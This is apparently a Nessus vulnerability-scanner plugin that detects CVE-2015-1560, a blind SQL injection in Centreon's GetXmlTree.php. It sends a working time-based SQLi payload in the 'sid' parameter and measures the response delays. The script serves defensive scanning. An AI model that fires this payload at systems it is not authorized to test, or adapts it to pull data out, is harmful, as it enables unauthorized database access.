#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(93244);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2016/11/17 21:12:11 $");

  script_cve_id("CVE-2015-1560");
  script_bugtraq_id(75602);
  script_osvdb_id(124315);
  script_xref(name:"EDB-ID", value:"37528");

  script_name(english:"Centreon GetXmlTree.php 'sid' Parameter SQLi");
  script_summary(english:"Attempts to exploit a SQLi flaw.");

  script_set_attribute(attribute:"synopsis", value:
"A PHP application running on the remote host is affected by a SQL
injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Centreon application running on the remote host is affected by a
SQL injection (SQLi) vulnerability in the isUserAdmin() function due
to improper sanitization of user-supplied input to the 'sid' parameter
of the GetXmlTree.php script. An unauthenticated, remote attacker can
exploit this issue, via a specially crafted request, to execute
arbitrary SQL statements against the back-end database, resulting in
the disclosure or manipulation of arbitrary data.

Note that the application is also reportedly affected by a remote
command injection vulnerability; however, Nessus has not tested for
this issue.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2015/Jul/47");
  script_set_attribute(attribute:"see_also", value:"https://github.com/centreon/centreon/releases?after=2.6.3");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Centreon version 2.6.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/07/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/09/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/08/31");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:centreon:centreon");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:merethis:centreon");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("centreon_detect.nbin");
  script_require_keys("www/PHP", "installed_sw/Centreon");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Centreon";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

stimes = make_list(3,5,7);
num_queries = max_index(stimes);

for (i = 0; i < max_index(stimes); i++)
{
  query = 'sleep('+stimes[i]+')';
  exploit = '/include/common/XmlTree/GetXmlTree.php?sid=%27%2Bif(1%3C2,'+query+
    ',%27%27)%2B%27';

  http_set_read_timeout(stimes[i] + 10);
  then = unixtime();

  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : dir + exploit,
    exit_on_fail : TRUE
  );

  now = unixtime();
  ttime = now - then;

  time_per_query += 'Query #' + (i+1) + ' : '+query+' -- Sleep Time : ' +
  stimes[i] + ' secs -- Response Time : ' + ttime + ' secs\n';

  overalltime += ttime;
  if ( (ttime >= stimes[i]) && (ttime <= (stimes[i] * 2)) )
  {
    vuln = TRUE;

    output =
      'Blind SQL Injection Results' +
      '\n  Query                      : ' + query +
      '\n  Response time              : ' + ttime + ' secs' +
      '\n  Number of queries executed : ' + num_queries +
      '\n  Total test time            : ' + overalltime + ' secs' +
      '\n  Time per query             : ' +
      '\n'+ "  " + time_per_query;

    continue;
  }
  else
  {
    vuln = FALSE;
    break;
  }
}

if (vuln)
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    generic    : TRUE,
    sqli       : TRUE,  # Sets SQLInjection KB key
    request    : make_list(install_url + exploit),
    output     : output
  );
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
